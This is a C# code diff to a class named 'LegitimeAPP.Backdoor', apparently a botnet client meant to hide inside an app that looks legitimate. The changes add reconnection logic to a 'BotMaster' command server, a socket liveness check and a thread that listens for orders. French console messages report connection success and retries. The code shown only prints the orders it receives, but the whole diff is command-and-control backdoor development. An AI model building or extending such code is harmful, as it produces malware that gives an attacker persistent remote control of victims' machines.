@@ -16,7 +16,8 @@ namespace LegitimeAPP.Backdoor {
         private IPAddress _masterIP ;
         private int _masterPort ;
 
-        private Stream stm ; 
+        private Stream stm ;
+        private TcpClient tcp ;
 
         // Thread 
         private Thread _FollowingOrders ;
@@ -64,19 +65,69 @@ namespace LegitimeAPP.Backdoor {
             stm.Write(enc.GetBytes(message)) ;
         }
 
+
+        public bool IsConnected
+{
+    get
+    {
+        try
+        {
+            if (tcp != null && tcp.Client != null && tcp.Client.Connected)
+            {
+               /* pear to the documentation on Poll:
+                * When passing SelectMode.SelectRead as a parameter to the Poll method it will return 
+                * -either- true if Socket.Listen(Int32) has been called and a connection is pending;
+                * -or- true if data is available for reading; 
+                * -or- true if the connection has been closed, reset, or terminated; 
+                * otherwise, returns false
+                */
+
+                // Detect if client disconnected
+                if (tcp.Client.Poll(0, SelectMode.SelectRead))
+                {
+                    byte[] buff = new byte[1];
+                    if (tcp.Client.Receive(buff, SocketFlags.Peek) == 0)
+                    {
+                        // Client disconnected
+                        return false;
+                    }
+                    else
+                    {
+                        return true;
+                    }
+                }
+
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+        catch
+        {
+            return false;
+        }
+    }
+}
+
         private void ListeningOrder() {
             while(true) {
-                string message = GetIncomingMessage() ;
 
-                Console.WriteLine(message) ;  
-
+                if ( IsConnected ) {
+                    string message = GetIncomingMessage() ;
+                    Console.WriteLine("Message : "+message) ;
+                } else {
+                    Console.WriteLine("Le serveur ne répond plus. Déconnection...") ; 
+                     break ;
+                }
             }
         }
 
         private void MakeConnectionRequest() {
 
             while (true) {
-            TcpClient tcp = new TcpClient() ;
+            tcp = new TcpClient() ;
             try {
                 // Tentative de connexion au BotMaster 
 
@@ -84,14 +135,18 @@ namespace LegitimeAPP.Backdoor {
                 stm = tcp.GetStream() ;
 
                 WriteNetMessage("1") ; 
+                Console.WriteLine("La connexion avec le botmaster est un succès") ; 
 
-                // On démarre le Thread lorsque la connexion est une réussite 
-                
+                // On démarre le Thread lorsque la connexion est une réussite
                 _FollowingOrders.Start() ; 
+                
+                _FollowingOrders.Join() ; 
 
-                break ; 
+                //_ConnectionRequests.Interrupt() ;
                 
             } catch( Exception _) {
+
+              //  Console.WriteLine(ex.Message) ; 
                 Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
                 }
                 Thread.Sleep(5000) ;  
